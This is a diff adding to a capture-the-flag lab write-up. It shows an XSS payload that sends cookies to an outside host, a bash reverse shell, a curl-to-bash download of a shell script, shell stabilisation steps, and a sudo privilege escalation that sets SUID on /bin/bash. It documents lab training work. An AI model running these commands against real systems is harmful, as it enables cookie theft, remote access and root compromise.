@@ -119,3 +119,63 @@
     <img src=x onerror=fetch('http://IP-ADDRESS/'+document.cookie);>
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/50786230-f4ed-4b7e-b867-d4294a8e6bd1)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/2f46367e-f8c0-41e3-aacd-eae73d703a10)
+
+
+        #!/bin/bash
+        /bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.91/6565 0>&1'
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/67c884b5-541e-415e-a87c-9c627d7634aa)
+
+start python server
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/34e786da-1f4b-473f-a6fb-71b73556dc01)
+
+listen port with rlwrap 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/c54c6ae0-4dd7-4aa3-bc07-7d1d59d2b7d4)
+
+    curl http://10.10.14.91/shell.sh|bash
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/5cf2004e-606a-4d55-8906-c9340a3de1d1)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/0037011d-77f3-4ec8-9135-d6629d685d19)
+
+    python -c 'import pty;pty.spawn("/bin/bash")'
+
+Ctrl + z
+
+    stty raw -echo;fg
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/35d48488-e64f-4d87-92b0-3287ec6a66a0)
+
+    export TERM=xterm
+
+get the user flag
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/b0ecc9e8-a4ed-4fb5-8889-aa502bec0c01)
+
+# Privilege escalation
+
+sudo -l
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1e8a4b99-3c88-4cc5-84fc-9729d3dade4e)
+
+cat /usr/bin/syscheck
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/839c66df-5849-4618-9e6d-b4bf3c4f9d20)
+
+    echo "chmod u+s /bin/bash" > initdb.sh
+    chmod +x initdb.sh
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/c671dc29-33b6-4d6c-a487-baf78ce2d6bc)
+
+    sudo /usr/bin/syscheck
+    /bin/bash -p
+
+And get the root flag
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/85486b7b-9063-42d6-a344-715339749d24)
+
+
